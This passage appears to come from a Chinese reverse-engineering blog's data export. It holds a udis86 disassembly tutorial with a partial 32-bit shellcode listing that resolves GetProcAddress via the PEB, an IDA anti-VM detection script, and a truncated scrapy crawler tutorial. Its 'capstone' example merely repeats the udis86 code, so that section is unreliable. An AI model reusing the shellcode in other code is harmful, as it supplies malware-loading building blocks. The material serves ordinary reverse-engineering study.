char[sAsm.AsmLen+1];\n\tZeroMemory(sAsm.pAsmCode, sAsm.AsmLen);\n\tfread_s(sAsm.pAsmCode, sAsm.AsmLen, 1, sAsm.AsmLen, fp);\n\tfclose(fp);\n\treturn sAsm;\n}\n\nint main()\n{\n\tFileInfo sAsm = LoadFileToMem(\"C:\\\\Users\\\\Cray\\\\Desktop\\\\dEMO\\\\Shellcode_64.bin\");\n\n\tud_t ud_obj;\n\n\tud_init(&ud_obj);\n\t//ud_set_input_file(&ud_obj, stdin);\t//从数据流中读入二进制数据\n\tud_set_input_buffer(&ud_obj, (PBYTE)sAsm.pAsmCode, sAsm.AsmLen);\t//内存中读入\n\tud_set_mode(&ud_obj, 64);\t//输出32位汇编\n\tud_set_syntax(&ud_obj, UD_SYN_INTEL); //INTEL 汇编语法\n\n\twhile (ud_disassemble(&ud_obj)) {\n\t\tprintf(\"\\t%s\\n\", ud_insn_asm(&ud_obj));\n\t}\n\n\tdelete[] sAsm.pAsmCode;\n\treturn 0;\n}\n```\n\n","slug":"udis86和capstone使用例子","published":1,"date":"2020-03-18T01:56:51.263Z","updated":"2020-03-18T02:10:45.939Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw62o0015ccuq85hqqjwr","content":"<h3 id=\"udis86\"><a href=\"#udis86\" class=\"headerlink\" title=\"udis86\"></a>udis86</h3><p>第一次使用很麻烦，（自己太菜</p>\n<p>lib库要自己去生成，源文件缺少头文件，未解决。使用加号生成的lib库</p>\n<p>要导入</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200310173936136.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200310173936136\"></p>\n<p>需要手动导入头文件<code>udis86.h</code></p>\n<p>lib库文件<code>libudis86.lib</code> </p>\n<p>测试代码如下</p>\n<pre><code class=\"c++\">#include &lt;stdio.h&gt;\n#include &lt;udis86.h&gt;\n#include &lt;windows.h&gt;\n#pragma comment(lib, &quot;libudis86.lib&quot;) \n\nstruct FileInfo\n{\n    LPVOID pAsmCode;\n    int AsmLen;\n};\n\nFileInfo LoadFileToMem(const char* FilePath)\n{\n    FileInfo sAsm;\n    FILE* fp;\n    fopen_s(&amp;fp, FilePath, &quot;rb&quot;);\n    fseek(fp, 0, SEEK_END);\n    sAsm.AsmLen = ftell(fp);\n    fseek(fp, 0, SEEK_SET);\n    sAsm.pAsmCode = new char[sAsm.AsmLen+1];\n    ZeroMemory(sAsm.pAsmCode, sAsm.AsmLen);\n    fread_s(sAsm.pAsmCode, sAsm.AsmLen, 1, sAsm.AsmLen, fp);\n    fclose(fp);\n    return sAsm;\n}\n\nint main()\n{\n    FileInfo sAsm = LoadFileToMem(&quot;C:\\\\Users\\\\Cray\\\\Desktop\\\\dEMO\\\\Shellcode_64.bin&quot;);\n\n    ud_t ud_obj;\n    ud_init(&amp;ud_obj);\n    //ud_set_input_file(&amp;ud_obj, stdin);    //从数据流中读入二进制数据\n    ud_set_input_buffer(&amp;ud_obj, (PBYTE)sAsm.pAsmCode, sAsm.AsmLen);    //内存中读入\n    ud_set_mode(&amp;ud_obj, 64);    //输出32位汇编\n    ud_set_syntax(&amp;ud_obj, UD_SYN_INTEL); //INTEL 汇编语法\n\n    while (ud_disassemble(&amp;ud_obj)) {\n        printf(&quot;\\t%s\\n&quot;, ud_insn_asm(&amp;ud_obj));\n    }\n    delete[] sAsm.pAsmCode;\n    return 0;\n}</code></pre>\n<p><strong>disasm.exe 生成的二进制格式，用来加载shellcode也是相当好用的</strong></p>\n<pre><code class=\"shell\">D:\\encodeDecodeOops\\udis&gt;disasm.exe  -b 32 -f c Shellcode_32.bin\n\n#define SHELLCODE_32_SIZE 307\nchar SHELLCODE_32[] = {\n  /* 0000 */ &quot;\\x31\\xc9&quot;                     /* xor ecx, ecx                    */\n  /* 0002 */ &quot;\\x64\\x8b\\x41\\x30&quot;             /* mov eax, [fs:ecx+0x30]          */\n  /* 0006 */ &quot;\\x8b\\x40\\x0c&quot;                 /* mov eax, [eax+0xc]              */\n  /* 0009 */ &quot;\\x8b\\x70\\x14&quot;                 /* mov esi, [eax+0x14]             */\n  /* 000C */ &quot;\\xad&quot;                         /* lodsd                           */\n  /* 000D */ &quot;\\x96&quot;                         /* xchg esi, eax                   */\n  /* 000E */ &quot;\\xad&quot;                         /* lodsd                           */\n  /* 000F */ &quot;\\x8b\\x58\\x10&quot;                 /* mov ebx, [eax+0x10]             */\n  /* 0012 */ &quot;\\x8b\\x53\\x3c&quot;                 /* mov edx, [ebx+0x3c]             */\n  /* 0015 */ &quot;\\x01\\xda&quot;                     /* add edx, ebx                    */\n  /* 0017 */ &quot;\\x8b\\x52\\x78&quot;                 /* mov edx, [edx+0x78]             */\n  /* 001A */ &quot;\\x01\\xda&quot;                     /* add edx, ebx                    */\n  /* 001C */ &quot;\\x8b\\x72\\x20&quot;                 /* mov esi, [edx+0x20]             */\n  /* 001F */ &quot;\\x01\\xde&quot;                     /* add esi, ebx                    */\n  /* 0021 */ &quot;\\x31\\xc9&quot;                     /* xor ecx, ecx                    */\n  /* 0023 */ &quot;\\x41&quot;                         /* inc ecx                         */\n  /* 0024 */ &quot;\\xad&quot;                         /* lodsd                           */\n  /* 0025 */ &quot;\\x01\\xd8&quot;                     /* add eax, ebx                    */\n  /* 0027 */ &quot;\\x81\\x38\\x47\\x65\\x74\\x50&quot;     /* cmp dword [eax], 0x50746547     */\n  /* 002D */ &quot;\\x75\\xf4&quot;                     /* jnz 0x23                        */\n  /* 002F */ &quot;\\x81\\x78\\x04\\x72\\x6f\\x63\\x41&quot; /* cmp dword [eax+0x4], 0x41636f72 */\n  /* 0036 */ &quot;\\x75\\xeb&quot;                     /* jnz 0x23                        */\n  /* 0038 */ &quot;\\x81\\x78\\x08\\x64\\x64\\x72\\x65&quot; /* cmp dword [eax+0x8], 0x65726464 */\n  /* 003F */ &quot;\\x75\\xe2&quot;                     /* jnz 0x23                        */\n  /* 0041 */ &quot;\\x8b\\x72\\x24&quot;                 /* mov esi, [edx+0x24]             */\n  /* 0044 */ &quot;\\x01\\xde&quot;                     /* add esi, ebx                    */\n  /* 0046 */ &quot;\\x66\\x8b\\x0c\\x4e&quot;             /* mov cx, [esi+ecx*2]             */\n      ...</code></pre>\n<h3 id=\"capstone\"><a href=\"#capstone\" class=\"headerlink\" title=\"capstone\"></a>capstone</h3><p>也是需要自己导入lib库</p>\n<p>例子如下，网上也有教程</p>\n<pre><code class=\"c++\">#include &lt;stdio.h&gt;\n#include &lt;udis86.h&gt;\n#include &lt;windows.h&gt;\n#pragma comment(lib, &quot;libudis86.lib&quot;) \n\nstruct FileInfo\n{\n    LPVOID pAsmCode;\n    int AsmLen;\n};\n\nFileInfo LoadFileToMem(const char* FilePath)\n{\n    FileInfo sAsm;\n    FILE* fp;\n    fopen_s(&amp;fp, FilePath, &quot;rb&quot;);\n    fseek(fp, 0, SEEK_END);\n    sAsm.AsmLen = ftell(fp);\n    fseek(fp, 0, SEEK_SET);\n    sAsm.pAsmCode = new char[sAsm.AsmLen+1];\n    ZeroMemory(sAsm.pAsmCode, sAsm.AsmLen);\n    fread_s(sAsm.pAsmCode, sAsm.AsmLen, 1, sAsm.AsmLen, fp);\n    fclose(fp);\n    return sAsm;\n}\n\nint main()\n{\n    FileInfo sAsm = LoadFileToMem(&quot;C:\\\\Users\\\\Cray\\\\Desktop\\\\dEMO\\\\Shellcode_64.bin&quot;);\n\n    ud_t ud_obj;\n\n    ud_init(&amp;ud_obj);\n    //ud_set_input_file(&amp;ud_obj, stdin);    //从数据流中读入二进制数据\n    ud_set_input_buffer(&amp;ud_obj, (PBYTE)sAsm.pAsmCode, sAsm.AsmLen);    //内存中读入\n    ud_set_mode(&amp;ud_obj, 64);    //输出32位汇编\n    ud_set_syntax(&amp;ud_obj, UD_SYN_INTEL); //INTEL 汇编语法\n\n    while (ud_disassemble(&amp;ud_obj)) {\n        printf(&quot;\\t%s\\n&quot;, ud_insn_asm(&amp;ud_obj));\n    }\n\n    delete[] sAsm.pAsmCode;\n    return 0;\n}</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"udis86\"><a href=\"#udis86\" class=\"headerlink\" title=\"udis86\"></a>udis86</h3><p>第一次使用很麻烦，（自己太菜</p>\n<p>lib库要自己去生成，源文件缺少头文件，未解决。使用加号生成的lib库</p>\n<p>要导入</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/typroa/image-20200310173936136.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200310173936136\"></p>\n<p>需要手动导入头文件<code>udis86.h</code></p>\n<p>lib库文件<code>libudis86.lib</code> </p>\n<p>测试代码如下</p>\n<pre><code class=\"c++\">#include &lt;stdio.h&gt;\n#include &lt;udis86.h&gt;\n#include &lt;windows.h&gt;\n#pragma comment(lib, &quot;libudis86.lib&quot;) \n\nstruct FileInfo\n{\n    LPVOID pAsmCode;\n    int AsmLen;\n};\n\nFileInfo LoadFileToMem(const char* FilePath)\n{\n    FileInfo sAsm;\n    FILE* fp;\n    fopen_s(&amp;fp, FilePath, &quot;rb&quot;);\n    fseek(fp, 0, SEEK_END);\n    sAsm.AsmLen = ftell(fp);\n    fseek(fp, 0, SEEK_SET);\n    sAsm.pAsmCode = new char[sAsm.AsmLen+1];\n    ZeroMemory(sAsm.pAsmCode, sAsm.AsmLen);\n    fread_s(sAsm.pAsmCode, sAsm.AsmLen, 1, sAsm.AsmLen, fp);\n    fclose(fp);\n    return sAsm;\n}\n\nint main()\n{\n    FileInfo sAsm = LoadFileToMem(&quot;C:\\\\Users\\\\Cray\\\\Desktop\\\\dEMO\\\\Shellcode_64.bin&quot;);\n\n    ud_t ud_obj;\n    ud_init(&amp;ud_obj);\n    //ud_set_input_file(&amp;ud_obj, stdin);    //从数据流中读入二进制数据\n    ud_set_input_buffer(&amp;ud_obj, (PBYTE)sAsm.pAsmCode, sAsm.AsmLen);    //内存中读入\n    ud_set_mode(&amp;ud_obj, 64);    //输出32位汇编\n    ud_set_syntax(&amp;ud_obj, UD_SYN_INTEL); //INTEL 汇编语法\n\n    while (ud_disassemble(&amp;ud_obj)) {\n        printf(&quot;\\t%s\\n&quot;, ud_insn_asm(&amp;ud_obj));\n    }\n    delete[] sAsm.pAsmCode;\n    return 0;\n}</code></pre>\n<p><strong>disasm.exe 生成的二进制格式，用来加载shellcode也是相当好用的</strong></p>\n<pre><code class=\"shell\">D:\\encodeDecodeOops\\udis&gt;disasm.exe  -b 32 -f c Shellcode_32.bin\n\n#define SHELLCODE_32_SIZE 307\nchar SHELLCODE_32[] = {\n  /* 0000 */ &quot;\\x31\\xc9&quot;                     /* xor ecx, ecx                    */\n  /* 0002 */ &quot;\\x64\\x8b\\x41\\x30&quot;             /* mov eax, [fs:ecx+0x30]          */\n  /* 0006 */ &quot;\\x8b\\x40\\x0c&quot;                 /* mov eax, [eax+0xc]              */\n  /* 0009 */ &quot;\\x8b\\x70\\x14&quot;                 /* mov esi, [eax+0x14]             */\n  /* 000C */ &quot;\\xad&quot;                         /* lodsd                           */\n  /* 000D */ &quot;\\x96&quot;                         /* xchg esi, eax                   */\n  /* 000E */ &quot;\\xad&quot;                         /* lodsd                           */\n  /* 000F */ &quot;\\x8b\\x58\\x10&quot;                 /* mov ebx, [eax+0x10]             */\n  /* 0012 */ &quot;\\x8b\\x53\\x3c&quot;                 /* mov edx, [ebx+0x3c]             */\n  /* 0015 */ &quot;\\x01\\xda&quot;                     /* add edx, ebx                    */\n  /* 0017 */ &quot;\\x8b\\x52\\x78&quot;                 /* mov edx, [edx+0x78]             */\n  /* 001A */ &quot;\\x01\\xda&quot;                     /* add edx, ebx                    */\n  /* 001C */ &quot;\\x8b\\x72\\x20&quot;                 /* mov esi, [edx+0x20]             */\n  /* 001F */ &quot;\\x01\\xde&quot;                     /* add esi, ebx                    */\n  /* 0021 */ &quot;\\x31\\xc9&quot;                     /* xor ecx, ecx                    */\n  /* 0023 */ &quot;\\x41&quot;                         /* inc ecx                         */\n  /* 0024 */ &quot;\\xad&quot;                         /* lodsd                           */\n  /* 0025 */ &quot;\\x01\\xd8&quot;                     /* add eax, ebx                    */\n  /* 0027 */ &quot;\\x81\\x38\\x47\\x65\\x74\\x50&quot;     /* cmp dword [eax], 0x50746547     */\n  /* 002D */ &quot;\\x75\\xf4&quot;                     /* jnz 0x23                        */\n  /* 002F */ &quot;\\x81\\x78\\x04\\x72\\x6f\\x63\\x41&quot; /* cmp dword [eax+0x4], 0x41636f72 */\n  /* 0036 */ &quot;\\x75\\xeb&quot;                     /* jnz 0x23                        */\n  /* 0038 */ &quot;\\x81\\x78\\x08\\x64\\x64\\x72\\x65&quot; /* cmp dword [eax+0x8], 0x65726464 */\n  /* 003F */ &quot;\\x75\\xe2&quot;                     /* jnz 0x23                        */\n  /* 0041 */ &quot;\\x8b\\x72\\x24&quot;                 /* mov esi, [edx+0x24]             */\n  /* 0044 */ &quot;\\x01\\xde&quot;                     /* add esi, ebx                    */\n  /* 0046 */ &quot;\\x66\\x8b\\x0c\\x4e&quot;             /* mov cx, [esi+ecx*2]             */\n      ...</code></pre>\n<h3 id=\"capstone\"><a href=\"#capstone\" class=\"headerlink\" title=\"capstone\"></a>capstone</h3><p>也是需要自己导入lib库</p>\n<p>例子如下，网上也有教程</p>\n<pre><code class=\"c++\">#include &lt;stdio.h&gt;\n#include &lt;udis86.h&gt;\n#include &lt;windows.h&gt;\n#pragma comment(lib, &quot;libudis86.lib&quot;) \n\nstruct FileInfo\n{\n    LPVOID pAsmCode;\n    int AsmLen;\n};\n\nFileInfo LoadFileToMem(const char* FilePath)\n{\n    FileInfo sAsm;\n    FILE* fp;\n    fopen_s(&amp;fp, FilePath, &quot;rb&quot;);\n    fseek(fp, 0, SEEK_END);\n    sAsm.AsmLen = ftell(fp);\n    fseek(fp, 0, SEEK_SET);\n    sAsm.pAsmCode = new char[sAsm.AsmLen+1];\n    ZeroMemory(sAsm.pAsmCode, sAsm.AsmLen);\n    fread_s(sAsm.pAsmCode, sAsm.AsmLen, 1, sAsm.AsmLen, fp);\n    fclose(fp);\n    return sAsm;\n}\n\nint main()\n{\n    FileInfo sAsm = LoadFileToMem(&quot;C:\\\\Users\\\\Cray\\\\Desktop\\\\dEMO\\\\Shellcode_64.bin&quot;);\n\n    ud_t ud_obj;\n\n    ud_init(&amp;ud_obj);\n    //ud_set_input_file(&amp;ud_obj, stdin);    //从数据流中读入二进制数据\n    ud_set_input_buffer(&amp;ud_obj, (PBYTE)sAsm.pAsmCode, sAsm.AsmLen);    //内存中读入\n    ud_set_mode(&amp;ud_obj, 64);    //输出32位汇编\n    ud_set_syntax(&amp;ud_obj, UD_SYN_INTEL); //INTEL 汇编语法\n\n    while (ud_disassemble(&amp;ud_obj)) {\n        printf(&quot;\\t%s\\n&quot;, ud_insn_asm(&amp;ud_obj));\n    }\n\n    delete[] sAsm.pAsmCode;\n    return 0;\n}</code></pre>\n"},{"title":"IDA 查找检测虚拟机代码","date":"2019-09-05T11:11:22.000Z","index_img":"https://dc.snscz.com/s2/img/1200/2019/04/01/14/14004_dd81742271.jpg","banner_img":"https://dc.snscz.com/s2/img/1200/2019/04/01/14/14004_dd81742271.jpg","_content":"\n\n\nFindAntiVM [来自github](https://github.com/zim123abc/virtualization-detection-ida-script/blob/dd8015ec6e130cf04272805730c78950b857c02b/src/findAntiVM.py)\n\n如果找到，以红色标注\n```python\nfrom idautils import *\nfrom idc import *\n\nheads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))\n\n#Calls to autorun/autorunsc -- these hide signed MS entries!!\npill_check = ['sidt', 'sgdt', 'sldt', 'smsw', 'str', 'in']\nmalicious_check = ['cmd','cpuid','autorun', 'autorunsc']\nvmware_check = ['Vmtoolsd', 'Vmwaretrat', 'Vmwareuser', 'Vmacthlp']\nvbox_check = ['vboxservice', 'vboxtray', 'VBOXBIOS']\nhostname_check = ['brbrb-d8fb22af1','KVMKVMKVM', 'prl hyperv', 'Microsoft Hv', 'XenVMMXenVMM']\nenv_check = ['dmesg', 'kmods', 'pcidevs',' dmidecode','sysfs','procfs', 'dashXmstdout']\nantiVM = []\n\nfor i in heads:\n        for x in pill_check,vmware_check,vbox_check,hostname_check,env_check,malicious_check:\n                if GetMnem(i) in x: \n\t                antiVM.append(i)\n\n#reset head to beginning of instructions\nheads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))\n\n#Check out Hex View-A for I/O ports\nfor x in heads:\n        if GetMnem(x) == \"mov\" and \"eax\" in GetOpnd(x, 0) and \"564D5868h\" in GetOpnd(x, 1):\n                if GetMnem(x + 1) == \"mov\" and \"edx\" in GetOpnd(x + 1, 0) and \"5658h\" in GetOpnd(x + 1, 1):\n                        if GetMnem(x + 2) == \"in\" and \"eax\" in GetOpnd(x + 2, 0) and \"dx\" in GetOpnd(x + 2, 1):\n                                antiVM.append(x)\n\n        elif GetMnem(x) == \"call\" and \"RtlGetNativeSystemInformation\" in GetOpnd(x, 0):\n                antiVM.append(x)\n\n        if \"564D5868h\" in GetOpnd(x, 1) or \"5658h\" in GetOpnd(x, 1):\n                antiVM.append(x)\n\nfor i in antiVM:\n\tSetColor(i, CIC_ITEM, 0x0000ff)\n        instruction = GetMnem(i)\n\tMessage(\"Anti-VM: %08x >>\" % i)\n        Message(\" %s\\n\" % instruction)\n        \nprint \"Number of potential Anti-VM instructions: %d\" % (len(antiVM))\n```\n\n或者使用`ScoopyNG`工具检测\n","source":"_posts/ida查找检测虚拟机代码.md","raw":"---\ntitle: IDA 查找检测虚拟机代码\ndate: 2019-09-05 19:11:22\nindex_img: https://dc.snscz.com/s2/img/1200/2019/04/01/14/14004_dd81742271.jpg\nbanner_img: https://dc.snscz.com/s2/img/1200/2019/04/01/14/14004_dd81742271.jpg\ntags:\n    - IDA\ncategories: 逆向\n---\n\n\n\nFindAntiVM [来自github](https://github.com/zim123abc/virtualization-detection-ida-script/blob/dd8015ec6e130cf04272805730c78950b857c02b/src/findAntiVM.py)\n\n如果找到，以红色标注\n```python\nfrom idautils import *\nfrom idc import *\n\nheads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))\n\n#Calls to autorun/autorunsc -- these hide signed MS entries!!\npill_check = ['sidt', 'sgdt', 'sldt', 'smsw', 'str', 'in']\nmalicious_check = ['cmd','cpuid','autorun', 'autorunsc']\nvmware_check = ['Vmtoolsd', 'Vmwaretrat', 'Vmwareuser', 'Vmacthlp']\nvbox_check = ['vboxservice', 'vboxtray', 'VBOXBIOS']\nhostname_check = ['brbrb-d8fb22af1','KVMKVMKVM', 'prl hyperv', 'Microsoft Hv', 'XenVMMXenVMM']\nenv_check = ['dmesg', 'kmods', 'pcidevs',' dmidecode','sysfs','procfs', 'dashXmstdout']\nantiVM = []\n\nfor i in heads:\n        for x in pill_check,vmware_check,vbox_check,hostname_check,env_check,malicious_check:\n                if GetMnem(i) in x: \n\t                antiVM.append(i)\n\n#reset head to beginning of instructions\nheads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))\n\n#Check out Hex View-A for I/O ports\nfor x in heads:\n        if GetMnem(x) == \"mov\" and \"eax\" in GetOpnd(x, 0) and \"564D5868h\" in GetOpnd(x, 1):\n                if GetMnem(x + 1) == \"mov\" and \"edx\" in GetOpnd(x + 1, 0) and \"5658h\" in GetOpnd(x + 1, 1):\n                        if GetMnem(x + 2) == \"in\" and \"eax\" in GetOpnd(x + 2, 0) and \"dx\" in GetOpnd(x + 2, 1):\n                                antiVM.append(x)\n\n        elif GetMnem(x) == \"call\" and \"RtlGetNativeSystemInformation\" in GetOpnd(x, 0):\n                antiVM.append(x)\n\n        if \"564D5868h\" in GetOpnd(x, 1) or \"5658h\" in GetOpnd(x, 1):\n                antiVM.append(x)\n\nfor i in antiVM:\n\tSetColor(i, CIC_ITEM, 0x0000ff)\n        instruction = GetMnem(i)\n\tMessage(\"Anti-VM: %08x >>\" % i)\n        Message(\" %s\\n\" % instruction)\n        \nprint \"Number of potential Anti-VM instructions: %d\" % (len(antiVM))\n```\n\n或者使用`ScoopyNG`工具检测\n","slug":"ida查找检测虚拟机代码","published":1,"updated":"2019-12-07T03:09:50.209Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw62p0018ccuq9150izpy","content":"<p>FindAntiVM <a href=\"https://github.com/zim123abc/virtualization-detection-ida-script/blob/dd8015ec6e130cf04272805730c78950b857c02b/src/findAntiVM.py\" target=\"_blank\" rel=\"noopener\">来自github</a></p>\n<p>如果找到，以红色标注</p>\n<pre><code class=\"python\">from idautils import *\nfrom idc import *\n\nheads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))\n\n#Calls to autorun/autorunsc -- these hide signed MS entries!!\npill_check = [&#39;sidt&#39;, &#39;sgdt&#39;, &#39;sldt&#39;, &#39;smsw&#39;, &#39;str&#39;, &#39;in&#39;]\nmalicious_check = [&#39;cmd&#39;,&#39;cpuid&#39;,&#39;autorun&#39;, &#39;autorunsc&#39;]\nvmware_check = [&#39;Vmtoolsd&#39;, &#39;Vmwaretrat&#39;, &#39;Vmwareuser&#39;, &#39;Vmacthlp&#39;]\nvbox_check = [&#39;vboxservice&#39;, &#39;vboxtray&#39;, &#39;VBOXBIOS&#39;]\nhostname_check = [&#39;brbrb-d8fb22af1&#39;,&#39;KVMKVMKVM&#39;, &#39;prl hyperv&#39;, &#39;Microsoft Hv&#39;, &#39;XenVMMXenVMM&#39;]\nenv_check = [&#39;dmesg&#39;, &#39;kmods&#39;, &#39;pcidevs&#39;,&#39; dmidecode&#39;,&#39;sysfs&#39;,&#39;procfs&#39;, &#39;dashXmstdout&#39;]\nantiVM = []\n\nfor i in heads:\n        for x in pill_check,vmware_check,vbox_check,hostname_check,env_check,malicious_check:\n                if GetMnem(i) in x: \n                    antiVM.append(i)\n\n#reset head to beginning of instructions\nheads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))\n\n#Check out Hex View-A for I/O ports\nfor x in heads:\n        if GetMnem(x) == &quot;mov&quot; and &quot;eax&quot; in GetOpnd(x, 0) and &quot;564D5868h&quot; in GetOpnd(x, 1):\n                if GetMnem(x + 1) == &quot;mov&quot; and &quot;edx&quot; in GetOpnd(x + 1, 0) and &quot;5658h&quot; in GetOpnd(x + 1, 1):\n                        if GetMnem(x + 2) == &quot;in&quot; and &quot;eax&quot; in GetOpnd(x + 2, 0) and &quot;dx&quot; in GetOpnd(x + 2, 1):\n                                antiVM.append(x)\n\n        elif GetMnem(x) == &quot;call&quot; and &quot;RtlGetNativeSystemInformation&quot; in GetOpnd(x, 0):\n                antiVM.append(x)\n\n        if &quot;564D5868h&quot; in GetOpnd(x, 1) or &quot;5658h&quot; in GetOpnd(x, 1):\n                antiVM.append(x)\n\nfor i in antiVM:\n    SetColor(i, CIC_ITEM, 0x0000ff)\n        instruction = GetMnem(i)\n    Message(&quot;Anti-VM: %08x &gt;&gt;&quot; % i)\n        Message(&quot; %s\\n&quot; % instruction)\n\nprint &quot;Number of potential Anti-VM instructions: %d&quot; % (len(antiVM))</code></pre>\n<p>或者使用<code>ScoopyNG</code>工具检测</p>\n","site":{"data":{}},"excerpt":"","more":"<p>FindAntiVM <a href=\"https://github.com/zim123abc/virtualization-detection-ida-script/blob/dd8015ec6e130cf04272805730c78950b857c02b/src/findAntiVM.py\" target=\"_blank\" rel=\"noopener\">来自github</a></p>\n<p>如果找到，以红色标注</p>\n<pre><code class=\"python\">from idautils import *\nfrom idc import *\n\nheads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))\n\n#Calls to autorun/autorunsc -- these hide signed MS entries!!\npill_check = [&#39;sidt&#39;, &#39;sgdt&#39;, &#39;sldt&#39;, &#39;smsw&#39;, &#39;str&#39;, &#39;in&#39;]\nmalicious_check = [&#39;cmd&#39;,&#39;cpuid&#39;,&#39;autorun&#39;, &#39;autorunsc&#39;]\nvmware_check = [&#39;Vmtoolsd&#39;, &#39;Vmwaretrat&#39;, &#39;Vmwareuser&#39;, &#39;Vmacthlp&#39;]\nvbox_check = [&#39;vboxservice&#39;, &#39;vboxtray&#39;, &#39;VBOXBIOS&#39;]\nhostname_check = [&#39;brbrb-d8fb22af1&#39;,&#39;KVMKVMKVM&#39;, &#39;prl hyperv&#39;, &#39;Microsoft Hv&#39;, &#39;XenVMMXenVMM&#39;]\nenv_check = [&#39;dmesg&#39;, &#39;kmods&#39;, &#39;pcidevs&#39;,&#39; dmidecode&#39;,&#39;sysfs&#39;,&#39;procfs&#39;, &#39;dashXmstdout&#39;]\nantiVM = []\n\nfor i in heads:\n        for x in pill_check,vmware_check,vbox_check,hostname_check,env_check,malicious_check:\n                if GetMnem(i) in x: \n                    antiVM.append(i)\n\n#reset head to beginning of instructions\nheads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))\n\n#Check out Hex View-A for I/O ports\nfor x in heads:\n        if GetMnem(x) == &quot;mov&quot; and &quot;eax&quot; in GetOpnd(x, 0) and &quot;564D5868h&quot; in GetOpnd(x, 1):\n                if GetMnem(x + 1) == &quot;mov&quot; and &quot;edx&quot; in GetOpnd(x + 1, 0) and &quot;5658h&quot; in GetOpnd(x + 1, 1):\n                        if GetMnem(x + 2) == &quot;in&quot; and &quot;eax&quot; in GetOpnd(x + 2, 0) and &quot;dx&quot; in GetOpnd(x + 2, 1):\n                                antiVM.append(x)\n\n        elif GetMnem(x) == &quot;call&quot; and &quot;RtlGetNativeSystemInformation&quot; in GetOpnd(x, 0):\n                antiVM.append(x)\n\n        if &quot;564D5868h&quot; in GetOpnd(x, 1) or &quot;5658h&quot; in GetOpnd(x, 1):\n                antiVM.append(x)\n\nfor i in antiVM:\n    SetColor(i, CIC_ITEM, 0x0000ff)\n        instruction = GetMnem(i)\n    Message(&quot;Anti-VM: %08x &gt;&gt;&quot; % i)\n        Message(&quot; %s\\n&quot; % instruction)\n\nprint &quot;Number of potential Anti-VM instructions: %d&quot; % (len(antiVM))</code></pre>\n<p>或者使用<code>ScoopyNG</code>工具检测</p>\n"},{"title":"muuto_scrapy爬虫","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164322714.png","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164322714.png","date":"2020-07-03T16:00:00.000Z","_content":"\n\n本项目是爬取一个家具网站的部分数据\n\n目标站：https://muuto.com/furniture\n\n### 前言\n\n本爬虫使用scrapy框架\n\n框架大概流程如下\n\n![image-20200705164322714](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164322714.png)\n\n配图来源：https://doc.scrapy.org/en/master/topics/architecture.html\n\n#### 下载样式\n\n保存格式如下\n\n![image-20200705164404797](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200705164404797.png)\n\n\n\n### 生成新对象\n\n```shell\nscrapy startproject sSofo\t\t\n```\n\n创建一个scrapy空对象，方便后期使用\n\n### 使用通用模板创建一个spider\n\n```shell\n  #scrapy genspidere [options] <name> <domain>\n  scrapy genspidere xxxx xxxx.com\n```\n\n### 详细配置文件\n\n上面生成默认配置文件后，下面贴出我修改的文件，没贴出的代码都默认处理\n\n#### item.py\n\n```python\n#item.py\nimport scrapy\n\nclass SsofaItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    srcurl = scrapy.Field()\n    videourl = scrapy.Field()\n    title = scrapy.Field() \n```\n\n#### spiders/example.py\n\n```python\n#spiders/example.py\nimport scrapy\nfrom sSofa.items import SsofaItem\n\nclass ExampleSpider(scrapy.Spider):\n    name = 'example'\n    myheaders = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',\n    }\n\n    def start_requests(self):\n        #爬虫开始运行执行的第一个函数\n        purl = \"https://muuto.com/furniture\"\n        yield scrapy.Request(purl,headers = self.myheaders)\n\n    def parse(self, response):\n        #默认第一次返回的response处理函数\n        div_xapth_list = response.xpath(\"//a[@class='product photo product-item-photo']/@href\").extract()\n        for each in div_xapth_list:\n            # 注意下面的callback是sec_page，所以返回的数据就到下面去处理\n            yield scrapy.Request(each,headers = self.myheaders,callback = self.sec_page)\n\n    def sec_page(self,response):\n        #处理第二次request返回的数据\n        \n        #item在这个框架中可以认为是一个全局变量一样的东西，给各个模块之间使用数据（个人理解）\n        item = SsofaItem()\n\n        title = response.xpath(\"//span[@data-ui-id='page-title-wrapper']/text()\").extract()\n        item['title'] = title \n        \n        source_video = response.xpath(\"//section[@id='video-unbranded']//iframe[@id='player']/@src\").extract()\n        item['videourl'] = source_video\n\n        xpathfilter =\"//section[@id='fifty-fifty-image-slider-text']//img/@src | //section[@id='brand-images']//img/@src | //section[@id='designer']//img/@src\"\n        srcurl = response.xpath(xpathfilter).extract()\n        item['srcurl'] = srcurl\n\n        # srcurl = response.xpath(\"//section[@id='fifty-fifty-image-slider-text']//img/@src\").extract()\n        # item['srcurl'] = srcurl\n\n        # brand_images = response.xpath(\"//section[@id='brand-images']//img/@src\").extract()\n        # item['srcurl'].append(brand_images)\n\n        # designer = response.xpath(\"//section[@id='designer']//img/@src\").extract()\n        # item['srcurl'].append(designer)\n\n        #这里返回item后，如果没有开启pipelimes，就到这里结束\n        #如果打开后，就去执行pipelimes中的代码\n        yield item\n```\n#### pipelines.py\n\n```python\n#pipelines.py\nimport scrapy\nfrom scrapy.pipelines.images import ImagesPipeline\n\n#注意这个类是继承自ImagesPipeline 而不是 object \nclass SsofaPipeline(ImagesPipeline):\n\n    myheaders = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 